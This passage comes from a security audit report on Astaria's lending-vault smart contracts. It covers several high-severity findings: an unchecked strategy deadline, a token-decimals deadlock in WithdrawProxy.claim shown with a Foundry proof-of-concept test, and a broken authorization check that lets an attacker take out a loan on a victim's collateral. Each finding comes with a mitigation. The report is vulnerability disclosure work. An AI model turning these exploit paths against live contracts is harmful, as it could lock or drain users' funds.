+If you search fordeadlinein the codebase you’ll see that there’s no other place where the property is accessed.
+As long as the user takes out the loan from the vault directly, they can use strategies that have expired. The vault owner could prevent this from happening by incrementing thestrategistNonceafter the strategy expired.
+Recommended Mitigation Steps
+InVaultImplementation._validateCommitment()check thatdeadline > block.timestamp.
+SantiagoGregory (Astaria) confirmed
+
+[H-20] Deadlock in vaults with underlying token with less then 18 decimals
+Submitted byTointer, also found byjoestakey,gz627,Jeiwan,obront,unforgiven,rvierdiiev, andchaduke
+If underlying token for the vault would have less then 18 decimals, then after liquidation there would be no way to process epoch, becauseclaimfunction inWithdrawProxy.solwould revert, this would lock all user out of their funds both in vault and in withdraw proxy. Alternatively, if there is more then 18 decimals, claim would leave much less funds than needed for withdraw, resulting in withdrawers losing funds.
+To make report more concise, I would focus on tokens with less then 18 decimals, because they are much more frequent. For example, WBTC have 8 decimals and most stablecoins have 6.
+Why is this happening
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L314-L316this part making sure that withdraw ratio are always stored in 1e18 scale.
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L271-L274but here, we are not transforming it into token decimals scale.transferAmountwould be orders of magnitudes larger than balance
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L277then, here we would have underflow ofbalancevalue
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L281and finally, here function would revert.
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L156https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L299becausePublicVault.solneedclaimto proccess epoch, andWithdrawProxy.solunlocks funds only afterclaim, it will result in deadlock of the whole system.
+Proof of Concept
+First, creating token with 8 decimals:
+contract Token8Decimals is ERC20{constructor() ERC20("TEST", "TEST", 8) {}function mint(address to, uint amount) public{_mint(to, amount);}}
+Second, I changed_bidfunction inTestHelpers.t.solcontract, so it could take token address as a last parameter, and use it instead of WETH.
+Then, here is modified “testLiquidation5050Split” test:
+function testLiquidation5050Split() public {TestNFT nft = new TestNFT(2);_mintNoDepositApproveRouter(address(nft), 5);address tokenContract = address(nft);uint256 tokenId = uint256(1);Token8Decimals token = new Token8Decimals();// create a PublicVault with a 14-day epochvm.startPrank(strategistOne);//bpsaddress publicVault = (ASTARIA_ROUTER.newPublicVault(14 days,strategistTwo,address(token),uint256(0),false,new address[](0),uint256(0)));vm.stopPrank();uint amountToLend = 10**8 * 1000;token.mint(address(1), amountToLend);vm.startPrank(address(1));token.approve(address(TRANSFER_PROXY), amountToLend);ASTARIA_ROUTER.depositToVault(IERC4626(publicVault),address(1),amountToLend,uint256(0));vm.stopPrank();ILienToken.Details memory lien = standardLienDetails;lien.liquidationInitialAsk = amountToLend*2;(, ILienToken.Stack[] memory stack1) = _commitToLien({vault: publicVault,strategist: strategistOne,strategistPK: strategistOnePK,tokenContract: tokenContract,tokenId: tokenId,lienDetails: lien,amount: amountToLend/4,isFirstLien: true});uint256 collateralId = tokenContract.computeId(tokenId);_signalWithdraw(address(1), publicVault);WithdrawProxy withdrawProxy = PublicVault(publicVault).getWithdrawProxy(PublicVault(publicVault).getCurrentEpoch());skip(14 days);OrderParameters memory listedOrder1 = ASTARIA_ROUTER.liquidate(stack1,uint8(0));token.mint(bidder, amountToLend);_bid(Bidder(bidder, bidderPK), listedOrder1, amountToLend/2, address(token));vm.warp(withdrawProxy.getFinalAuctionEnd());emit log_named_uint("finalAuctionEnd", block.timestamp);PublicVault(publicVault).processEpoch();skip(13 days);withdrawProxy.claim();}
+withdrawProxy.claim();at the last line would revert
+Recommended Mitigation Steps
+https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L273Change this line to10**18
+Severity
+I think this is high risk, because
+There are high demand for stablecoin denominated vaults, and Astaria are designed to support that.This bug is sneaky, there could be many epochs before first liquidation that would trigger the deadlock.ALL funds would be lost, which is catastrophic.
+SantiagoGregory (Astaria) confirmed via duplicate issue#482
+
+[H-21] Attacker can take loan for Victim
+Submitted bycsanuragjain, also found bybin2chen,cergyk,evan,7siech,obront,KIntern_NA,Koolex, andunforgiven
+An unapproved, non-owner of collateral can still take loan for the owner/operator of collateral even when owner did not needed any loan. This is happening due to incorrect checks as shown in POC. This leads to unintended loan and associated fees for users.
+Proof of Concept
+A new loan is originated viacommitToLienfunction by User X. Params used by User X are as below:
+collateralId = params.tokenContract.computeId(params.tokenId) = 1CT.ownerOf(1) = User YCT.getApproved(1) = User ZCT.isApprovedForAll(User Y, User X) = falsereceiver = User Y
+This internally make call to_requestLienAndIssuePayoutwhich then calls_validateCommitmentfunction for signature verificationLets see the signature verification part in_validateCommitmentfunction
+function _validateCommitment(IAstariaRouter.Commitment calldata params,address receiver) internal view {uint256 collateralId = params.tokenContract.computeId(params.tokenId);ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));address holder = CT.ownerOf(collateralId);address operator = CT.getApproved(collateralId);if (msg.sender != holder &&receiver != holder &&receiver != operator &&!CT.isApprovedForAll(holder, msg.sender)) {revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);}VIData storage s = _loadVISlot();address recovered = ecrecover(keccak256(_encodeStrategyData(s,params.lienRequest.strategy,params.lienRequest.merkle.root)),params.lienRequest.v,params.lienRequest.r,params.lienRequest.s);if ((recovered != owner() && recovered != s.delegate) ||recovered == address(0)) {revert IVaultImplementation.InvalidRequest(InvalidRequestReason.INVALID_SIGNATURE);}}
+Ideally the verification should fail since :
+a. User X is not owner of passed collateralb. User X is not approved for this collateralc. User X is not approved for all of User Y token
+But observe the below if condition doing the required check:
+uint256 collateralId = params.tokenContract.computeId(params.tokenId);ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));address holder = CT.ownerOf(collateralId);address operator = CT.getApproved(collateralId);if (msg.sender != holder &&receiver != holder &&receiver != operator &&!CT.isApprovedForAll(holder, msg.sender)) {revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);}
+In our case this if condition does not execute since receiver = holder
+if (msg.sender != holder && // true since User X is not the ownerreceiver != holder && // false since attacker passed receiver as User Y which is owner of collateral, thus failing this if conditionreceiver != operator &&!CT.isApprovedForAll(holder, msg.sender)) {revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);}
+This means the signature verification passes and loan is issued for collateral owner without his wish
+Recommended Mitigation Steps
+Revise the condition as shown below:
+if (msg.sender != holder &&msg.sender != operator &&!CT.isApprovedForAll(holder, msg.sender)) {revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);}if (receiver != holder &&receiver != operator) {revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);}
+SantiagoGregory (Astaria) confirmed via duplicate issue#565
+
